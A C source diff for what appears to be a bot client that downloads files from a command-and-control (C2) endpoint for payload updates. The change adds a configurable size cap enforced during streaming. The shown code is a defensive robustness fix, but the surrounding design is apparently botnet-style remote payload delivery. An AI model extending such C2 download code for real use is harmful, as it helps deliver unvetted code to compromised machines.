@@ -1512,6 +1512,12 @@ static int http_connect_url(notnet_bot_t *bot, const char *url,
 }
 
 int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
+    /* Legacy callers keep the historical 32MB ceiling. */
+    return http_download_max(bot, url, dest, 32L * 1024L * 1024L);
+}
+
+int http_download_max(notnet_bot_t *bot, const char *url, const char *dest,
+                      long max_bytes) {
     /* Parse the target URL. Fall back to the configured C2 endpoint
      * when url is NULL/empty so the old callers keep working. */
     char host[256];
@@ -1564,7 +1570,7 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
      * are buffered small; body bytes are written to the file incrementally
      * with a generous cap (callers that need strict limits validate the
      * result themselves, e.g. payload_update checks PAYLOAD_MAX_SIZE). */
-    enum { HDR_BUF_SIZE = 8192, MAX_DOWNLOAD_SIZE = 32 * 1024 * 1024 };
+    enum { HDR_BUF_SIZE = 8192 };
     char hdr_buf[HDR_BUF_SIZE];
     int hdr_len = 0;
     int body_start = -1;   /* offset in hdr_buf where body begins, -1 until found */
@@ -1687,9 +1693,12 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         body_len = in_hdr;
     }
 
-    /* Continue streaming remaining body bytes. */
+    /* Continue streaming remaining body bytes. #293: enforce max_bytes
+     * DURING the receive loop — abort, close, and unlink as soon as the
+     * next chunk would exceed the cap instead of letting a hostile
+     * stream fill the disk until a post-hoc check runs. */
     char stream_buf[8192];
-    while (body_len < MAX_DOWNLOAD_SIZE) {
+    while (body_len < max_bytes) {
         fd_set read_fds;
         struct timeval tv;
         FD_ZERO(&read_fds);
@@ -1702,6 +1711,14 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
 
         int received = chan_recv(&tls, sock, stream_buf, sizeof(stream_buf));
         if (received <= 0) break;
+        if ((long)body_len + received > max_bytes) {
+            log_error("http_download: body exceeds cap (%ld bytes) from %s:%u",
+                      max_bytes, host, port);
+            fclose(f);
+            close(sock);
+            unlink(dest);
+            return -1;
+        }
         fwrite(stream_buf, 1, (size_t)received, f);
         body_len += received;
     }
@@ -1713,9 +1730,9 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         unlink(dest);
         return -1;
     }
-    if (body_len >= MAX_DOWNLOAD_SIZE) {
-        log_error("http_download: body exceeds cap (%d bytes) from %s:%u",
-                  body_len, host, port);
+    if (body_len >= max_bytes) {
+        log_error("http_download: body exceeds cap (%ld bytes) from %s:%u",
+                  max_bytes, host, port);
         unlink(dest);
         return -1;
     }
